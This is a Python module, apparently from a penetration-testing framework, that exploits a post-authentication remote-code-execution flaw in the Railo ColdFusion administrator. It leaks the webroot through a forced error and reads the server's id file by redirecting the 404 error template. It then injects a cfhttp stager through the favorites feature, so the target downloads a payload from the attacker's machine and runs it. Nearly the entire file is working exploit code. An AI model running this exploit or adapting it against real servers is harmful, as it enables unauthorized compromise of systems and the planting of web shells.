from src.platform.railo.authenticate import checkAuth
from src.platform.railo.interfaces import RINTERFACES
from src.module.deploy_utils import _serve, waitServe, killServe, parse_war_path
from re import findall
from log import LOG
from hashlib import md5
from time import sleep
from os.path import abspath
from threading import Thread
from urllib import quote
from shutil import copyfile
import state
import utility

title = RINTERFACES.WEB
versions = ['3.3', '4.0', '4.1', '4.2']
def deploy(fingerengine, fingerprint):
    """ Exploit a post-auth RCE vulnerability in Railo; uses a simple cfhttp
    stager to drop the payload
    """

    payload = parse_war_path(fingerengine.options.deploy, True)
    payload_path = abspath(fingerengine.options.deploy)
    stager = ":<cfhttp method=\"get\" url=\"http://{0}:{1}/{2}\""\
             " path=\"{3}\" file=\"{2}\">"
    base = 'http://{0}:{1}'.format(fingerengine.options.ip,
                                   fingerprint.port)

    cookie = checkAuth(fingerengine.options.ip, fingerprint.port,
                       fingerprint.title)
    if not cookie:
        utility.Msg("Could not get auth for %s:%s" % (fingerengine.options.ip,
                                                      fingerprint.port),
                                                      LOG.ERROR)
        return

    utility.Msg("Fetching path...")
    path = fetchPath(fingerengine, fingerprint)
    utility.Msg("Found path %s" % path, LOG.DEBUG)

    # configure stager
    stager = quote(stager.format(utility.local_address(), state.external_port,
                   payload, path + "\context" if fingerengine.options.remote_os \
                                    is 'windows' else '/context'))

    utility.Msg("Pulling id file...")
    fid = fetchId(base, path, cookie)
    if not fid:
        return

    utility.Msg("Found id %s" % fid, LOG.DEBUG)

    # we've got both the security token and the security key, calculate filename
    session_file = md5(fid + md5(path).hexdigest()).hexdigest()
    utility.Msg("Session file is web-%s.cfm, attempting to inject stager..." % session_file)

    # trigger a new favorite with our web shell
    uri = '/railo-context/admin/web.cfm?action=internal.savedata'
    uri += '&action2=addfavorite&favorite=%s' % stager

    response = utility.requests_get(base + uri, cookies=cookie)
    if not response.status_code is 200:
        utility.Msg("Failed to deploy stager (HTTP %d)" % response.status_code,
                                                             LOG.ERROR)
        return

    utility.Msg("Stager deployed, invoking...", LOG.SUCCESS)
    
    copyfile(payload_path, "{0}/{1}".format(state.serve_dir, payload))
    server_thread = Thread(target=_serve, args=("%s/%s" % (state.serve_dir, payload),))
    server_thread.start()
    sleep(2)

    # invoke
    data_uri = "/railo-context/admin/userdata/web-%s.cfm" % session_file
    _ = utility.requests_get(base + data_uri)

    if waitServe(server_thread):
        utility.Msg("{0} deployed at /railo-context/{0}".format(payload), LOG.SUCCESS)

    killServe()


def fetchPath(fingerengine, fingerprint):
    """ We need the path up to WEB-INF\\railo
    """

    # attempt to trigger an error and pull the webroot
    base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
    uri = '/railo-context/admin/asdf.cfm'

    response = utility.requests_get(base + uri)
    if len(response.content) > 10:

        data = findall("Page /admin/asdf.cfm \[(.*?)\]", response.content)
        if len(data) > 0:
            return data[0].rsplit("\\", 3)[0]


def fetchId(base, path, cookie):
    """ Pretty simple two-step process to fetch the id:

            a) Set the error handler template to the id file
            b) Trigger an error
            c) restore handler
    """

    # set error handler
    set_template = '/railo-context/admin/web.cfm?action=server.error'
    data = { 'errType500' : 'Select',
             'errorTemplate_Select500' : '/railo-context/templates/error/error.cfm', # default
             'errType404' : 'File',
             'errorTemplate_File404' : '/railo-context/../id',
             'doStatusCode' : 'yes',
             'mainAction' : 'update'
    }

    response = utility.requests_post(base + set_template, data=data, cookies=cookie)
    if response.status_code is not 200:
        utility.Msg("Failed to set error handler (HTTP %d)" % response.status_code, LOG.ERROR)
        return None

    # trigger 404 and pull file
    response = utility.requests_get(base + '/railo-context/admin/xx.cfm')
    id = response.content

    # got the ID, restore handler
    data['errorTemplate_File404'] = '/railo-context/templates/error/error.cfm'
    response = utility.requests_post(base + set_template, data=data, cookies=cookie)
    return id
